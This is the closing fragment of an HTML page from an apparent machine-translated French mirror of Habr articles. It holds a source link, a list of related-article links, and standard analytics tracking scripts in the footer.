href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Extrait</a> <br><br>  Pour Khabrozhiteley 20% de r√©duction sur le coupon - <b>Une autopsie s'affichera</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr416143/">https://habr.com/ru/post/fr416143/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr416131/index.html">Comment g√©rer la MP dans la F√©d√©ration de Russie et ne pas enfreindre la loi</a></li>
<li><a href="../fr416133/index.html">Centre de donn√©es √† l'√©tranger: Equinix LD8</a></li>
<li><a href="../fr416135/index.html">Application GUI inf√©rieure √† 1 ko</a></li>
<li><a href="../fr416137/index.html">Zabbix comme scanner de s√©curit√©</a></li>
<li><a href="../fr416139/index.html">Authentification forte dans le cadre de la strat√©gie GDPR</a></li>
<li><a href="../fr416147/index.html">Organisation de la navigation dans les applications iOS √† l'aide du Root Controller</a></li>
<li><a href="../fr416149/index.html">Questions et r√©ponses sur les √©nergies renouvelables, partie 1</a></li>
<li><a href="../fr416151/index.html">Ballon sans dimension. Magie d'analyse de dimension utilitaire</a></li>
<li><a href="../fr416153/index.html">Les avions deviendront-ils plus fiables? Les constructeurs d'avions pr√©sentent des robots aux entreprises</a></li>
<li><a href="../fr416155/index.html">WebSockets dans Angular: cr√©ez un service angulaire pour travailler avec des sockets Web</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>